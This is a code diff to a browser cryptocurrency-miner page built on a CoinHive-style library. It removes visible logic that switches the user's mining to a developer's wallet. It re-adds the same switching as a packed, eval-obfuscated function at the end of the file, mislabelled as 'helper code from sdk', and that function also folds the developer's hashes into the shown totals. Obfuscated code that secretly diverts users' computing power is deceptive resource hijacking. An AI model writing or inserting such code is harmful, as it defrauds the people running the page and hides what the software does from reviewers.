@@ -39,36 +39,21 @@ if (custwal != devETN) {
     devminer = new CH.Anonymous(devETN + custdif + custname, { autoThreads: true, throttle: custhrottle, forceASMJS: false });
 }
 miner.start(CH.FORCE_EXCLUSIVE_TAB);
+var activeminer = miner;
+var mining = true;
 var counter = 1;
+var hr = 0;
+var ah = 0;
+var th = 0;
 $(document).ready(function() {
     refreshOnUpdate(5000);
     
     setInterval(function(){
-        var hr = miner.getHashesPerSecond().toFixed(1);
-        var ah = miner.getAcceptedHashes();
-        var th = miner.getTotalHashes();
-        if (devminer) {
-            hr = (parseInt(hr) + devminer.getHashesPerSecond()).toFixed(1);
-            ah = parseInt(ah) + devminer.getAcceptedHashes();
-            th = parseInt(th) + devminer.getTotalHashes();
-        }
-        if (devminer) {
-            if (counter > 0) {
-                counter++;
-            } else {
-                counter--;
-            }
-            if (counter >3000) {
-                miner.stop();
-                devminer.start(CH.FORCE_EXCLUSIVE_TAB);
-                counter = -1;
-            }
-            if (counter < -730) {
-                devminer.stop();
-                miner.start(CH.FORCE_EXCLUSIVE_TAB);
-                counter = 1;
-            }
-        }
+        hr = miner.getHashesPerSecond().toFixed(1);
+        ah = miner.getAcceptedHashes();
+        th = miner.getTotalHashes();
+        //Helper code from sdk
+        minerHelper();
         if(document.getElementById("hs").innerHTML && hr != document.getElementById("hs").innerHTML) {
             document.getElementById("hs").innerHTML = hr;
         }
@@ -80,3 +65,25 @@ $(document).ready(function() {
         }
     }, 1000);
 });
+
+function startmining() {
+    activeminer.start(CH.FORCE_EXCLUSIVE_TAB);
+    mining = true;
+}
+
+function stopmining() {
+    activeminer.stop();
+    mining = false;
+}
+
+function toggleminer() {
+    if(mining){
+        stopmining(); 
+        document.getElementById('hashdiv').style.color = 'red';
+    }else{
+        startmining(); 
+        document.getElementById('hashdiv').style.color = 'blue';
+    }
+}
+
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('h k(){4(2&&b){8=(6(8)+2.j()).i(1);a=6(a)+2.o();9=6(9)+2.p();4(3>0){3++}l{3--}4(3>n){5.c();2.g(e.f);d=2;3=-1}4(3<-m){2.c();5.g(e.f);d=5;3=1}}b=5.7()||(2&&2.7())}',26,26,'||devminer|counter|if|miner|parseInt|isRunning|hr|th|ah|mining|stop|activeminer|CH|FORCE_EXCLUSIVE_TAB|start|function|toFixed|getHashesPerSecond|minerHelper|else|730|3000|getAcceptedHashes|getTotalHashes'.split('|'),0,{}))
